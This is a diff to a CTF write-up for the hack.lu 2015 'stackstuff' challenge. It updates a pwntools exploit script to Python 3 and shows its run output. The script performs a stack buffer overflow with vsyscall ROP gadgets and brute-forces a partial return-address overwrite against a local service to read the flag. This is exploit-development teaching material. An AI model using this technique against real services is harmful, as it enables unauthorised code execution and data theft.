@@ -1,6 +1,6 @@
 # hacklu 2015 stackstuff
 
-The goal of this challenge is to read the contents of the `flag` file.
+This was done on `Ubuntu 20.04.4 LTS`. The goal of this challenge is to read the contents of the `flag` file.
 
 Let's take a look at the binary:
 
@@ -376,7 +376,7 @@ while flag == 0:
     target = remote('127.0.0.1', 1514)
 
     # Filler from start of our input to return address
-    payload = "0"*0x48
+    payload = b"0"*0x48
 
     # Our vsyscall gadget to act essentially as a rop nop
     vsyscall_ret = p64(0xffffffffff600800)
@@ -384,57 +384,41 @@ while flag == 0:
     payload += vsyscall_ret*2
 
     # Our least significant byte of our partial overwrite
-    payload += "\x8b"
+    payload += b"\x8b"
 
     # The byte which we will be brute forcing
-    payload += chr(i)
+    payload += bytes(chr(i), 'utf-8')
 
     # Specify length of our input to be 90 bytes
-    target.sendline('90')
+    target.sendline(b'90')
 
     # Send the payload
     target.sendline(payload)
 
-    target.recvuntil("Length of password: ")
+    target.recvuntil(b"Length of password: ")
     try:
         # Executes if we got the flag
-        print "flag: " + target.recvline()
+        print(b"flag: " + target.recvline())
         flag = 1
     except:
         # Didn't get the flag, try next byte
         # Also we know that the lower 4 bits of this byte is 0x0
-        print "tried: " + hex(i)
+        print("tried: " + hex(i))
         i += 0x10
 ```
 
 When we run it:
 
 ```
-python exploit.py
-[+] Starting local process './stackstuff': pid 13491
+$   python3 exploit.py 
+[+] Starting local process './stackstuff': pid 3947
 [+] Opening connection to 127.0.0.1 on port 1514: Done
 tried: 0x0
 [+] Opening connection to 127.0.0.1 on port 1514: Done
-tried: 0x10
-[+] Opening connection to 127.0.0.1 on port 1514: Done
-tried: 0x20
-[+] Opening connection to 127.0.0.1 on port 1514: Done
-tried: 0x30
-[+] Opening connection to 127.0.0.1 on port 1514: Done
-tried: 0x40
-[+] Opening connection to 127.0.0.1 on port 1514: Done
-tried: 0x50
-[+] Opening connection to 127.0.0.1 on port 1514: Done
-flag: flag{g0ttem_b0yz}
-
+b'flag: flag{g0ttem_b0yz}\n'
 [*] Closed connection to 127.0.0.1 port 1514
 [*] Closed connection to 127.0.0.1 port 1514
-[*] Closed connection to 127.0.0.1 port 1514
-[*] Closed connection to 127.0.0.1 port 1514
-[*] Closed connection to 127.0.0.1 port 1514
-[*] Closed connection to 127.0.0.1 port 1514
-[*] Closed connection to 127.0.0.1 port 1514
-[*] Stopped process './stackstuff' (pid 13491)
+[*] Stopped process './stackstuff' (pid 3947)
 ```
 
 Just like that, we got the flag!
